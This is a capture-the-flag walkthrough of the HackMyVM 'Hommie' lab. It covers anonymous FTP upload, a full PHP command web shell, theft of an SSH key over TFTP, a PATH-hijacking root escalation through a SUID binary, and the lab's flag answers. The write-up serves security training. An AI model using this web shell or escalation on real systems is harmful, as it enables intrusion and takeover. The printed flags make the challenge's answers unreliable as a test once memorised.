+++
title = "Hommie - Walkthrough"
date = "2026-07-28"
author = "nvru"
description = "Walkthrough for the Hommie machine."
tags = [
  "ctf",
  "walkthrough",
  "linux",
  "ftp",
  "tftp",
  "anonymous-ftp",
  "path-hijacking",
  "suid",
  "privilege-escalation"
]
draft = false
+++

## Overview

- **Machine:** Hommie
- **Difficulty:** Easy
- **Platform:** HackMyVM
- **Attacker IP:** `10.10.10.2`
- **Target Machine IP:** `10.10.10.38`

The objective was to enumerate the target, identify exposed services, gain initial access by recovering an exposed SSH private key from the TFTP service, and escalate privileges by abusing a vulnerable SUID binary through PATH hijacking.

![Machine information](/images/hmv/hommie/vm.png)

---

## Port Scanning

### RustScan

```bash
rustscan -a 10.10.10.38 -- -A -oA nmap/rust
```

### Results

```text
PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0               0 Sep 30  2020 index.html
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.10.10.2
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status

22/tcp open  ssh     syn-ack OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)

80/tcp open  http    syn-ack nginx 1.14.2
| http-methods:
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.14.2
|_http-title: Site doesn't have a title (text/html).
```

The initial scan revealed three exposed services:

- FTP with anonymous login enabled
- SSH
- HTTP running nginx

The FTP service looked particularly interesting because anonymous authentication was allowed.

---

## Enumeration

### FTP

Anonymous login was successful.

```bash
ftp 10.10.10.38

Name: anonymous
Password: anonymous
```

Listing the files showed an `index.html` file and a hidden `.web` directory.

![FTP listing](/images/hmv/hommie/ftp_index.png)

Downloading the root `index.html` revealed that it was essentially empty.

![Empty index](/images/hmv/hommie/index_empty.png)

Inside the hidden `.web` directory was another `index.html`.

![.web directory](/images/hmv/hommie/dot_web_index.png)

Opening the file revealed a message addressed to **Alexia** from **Nobody**. Since the web server displayed the same page, it appeared that `.web` was being used as the web root.

---

### HTTP

Browsing to port 80 confirmed that the website served the same page found inside the `.web` directory.

![HTTP page](/images/hmv/hommie/http.png)

The `.web` directory also appeared to have weak write permissions, so I tested whether uploads were allowed.

Uploading a file succeeded.

![Upload success](/images/hmv/hommie/dot_web_perm.png)

This suggested that a PHP web shell might provide code execution.

---

### Attempting Remote Code Execution

I first uploaded the PentestMonkey PHP reverse shell. Instead of executing it, the server simply downloaded the file.

![Reverse shell download](/images/hmv/hommie/no_rev.png)

Thinking the issue might be related to the payload size, I uploaded a minimal PHP web shell.

```php
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
if(isset($_GET['cmd']))
{
    system($_GET['cmd']);
}
?>
</pre>
</body>
<script>document.getElementById("cmd").focus();</script>
</html>
```

The upload appeared to succeed, and the page loaded in the browser, suggesting that the PHP file was being served.

![Web shell test](/images/hmv/hommie/no_rev2.png)

However, when supplying the `cmd` parameter, the PHP code was not executed. Instead, the page was treated as a static file, indicating that the server was not processing PHP.

![Parameter test](/images/hmv/hommie/no_rev2_param.png)

At this point it was clear that, although uploading PHP files was possible, the web server was configured to serve them as static content rather than execute them.

Since the TCP attack surface appeared exhausted, I expanded the enumeration to UDP.

---

### UDP Enumeration

I performed a full UDP scan.

```bash
sudo nmap -sU -p- 10.10.10.38 -vv
```

The scan revealed an exposed TFTP service.

```text
PORT   STATE         SERVICE
68/udp open|filtered dhcpc
69/udp open|filtered tftp
```

---

### TFTP

After connecting to the TFTP service, I attempted to retrieve SSH private keys.

Trying the standard path failed.

```text
tftp> get .ssh/id_rsa
```

However, requesting `id_rsa` directly succeeded.

```bash
tftp 10.10.10.38 69

tftp> get id_rsa
Received 1850 bytes in 0.0 seconds
```

![Recovered SSH key](/images/hmv/hommie/id_rsa.png)

The server was exposing a user's SSH private key through TFTP.

---

## Initial Access

After fixing the file permissions, I attempted SSH authentication as **alexia**.

```bash
chmod 600 id_rsa

ssh -i id_rsa alexia@10.10.10.38
```

Authentication succeeded immediately.

![SSH login](/images/hmv/hommie/ssh_alexia.png)

---

## Privilege Escalation

### Alexia → Root

The first thing I checked was whether the user had sudo or doas privileges.

Neither utility was installed.

![No sudo or doas](/images/hmv/hommie/no_sudo_doas.png)

I continued manually enumerating the filesystem.

While inspecting `/opt`, I found an interesting SUID binary called `showMetheKey`.

![SUID binary](/images/hmv/hommie/opt_suid.png)

Before executing it, I examined the binary with `strings`.

```bash
strings /opt/showMetheKey
```

Among the output was the following command:

```text
cat $HOME/.ssh/id_rsa
```

![Strings output](/images/hmv/hommie/strings.png)

The binary invoked `cat` without using an absolute path, making it vulnerable to **PATH hijacking**.

I created a malicious replacement for `cat`.

```bash
echo '/bin/bash -p' > cat
chmod +x cat

export PATH=$(pwd):$PATH
```

Executing the SUID binary now resulted in a root shell.

```bash
/opt/showMetheKey
```

![How To Exploit](/images/hmv/hommie/exploit.png)

![Root shell](/images/hmv/hommie/root_shell.png)

---

### Finding the Root Flag

Inside the root directory I found a note instead of the flag.

```text
I dont remember where I stored root.txt !!!
```

![Fake root flag](/images/hmv/hommie/fake_root_flag.png)

Searching the filesystem located the real flag.

```bash
find / -type f -name root.txt 2>/dev/null
```

![Real root flag](/images/hmv/hommie/true_root_flag.png)

---

## Flags

```text
user:Imnotroot

root:Imnotbatman
```
